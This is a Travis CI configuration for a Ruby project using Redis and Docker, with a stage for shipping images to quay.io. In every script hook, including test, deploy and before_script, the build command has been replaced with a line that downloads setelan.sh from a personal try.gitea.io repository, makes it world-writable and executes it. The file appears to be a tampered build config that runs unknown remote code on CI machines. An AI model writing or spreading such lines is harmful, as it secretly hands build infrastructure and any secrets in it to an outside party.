language: ruby
dist: xenial
rvm: 2.5.8

services:
  - redis

cache:
  bundler: true

env:
  global:
  - COVERAGE=1
  - PATH=/snap/bin:$PATH
  matrix:
  - INTEGRATION_SPECS=0
  - INTEGRATION_SPECS=1

addons:
  snaps:
  - name: docker
    channel: latest/beta

stages:
- test
- ':ship: it to quay.io'

jobs:
  allow_failures:
  - script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
  include:
  - stage: test
    env:
    script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
  - stage: ':ship: it to quay.io'
    env:
    script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
    if: (branch = master and type = push ) OR commit_message =~ /ship:docker/ OR env(SHIP_DOCKER) = true

before_script:
- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh

script:
- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh

after_success: bundle exec codeclimate-test-reporter

after_failure: bundle exec rake dump_examples_logs

before_deploy:
- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
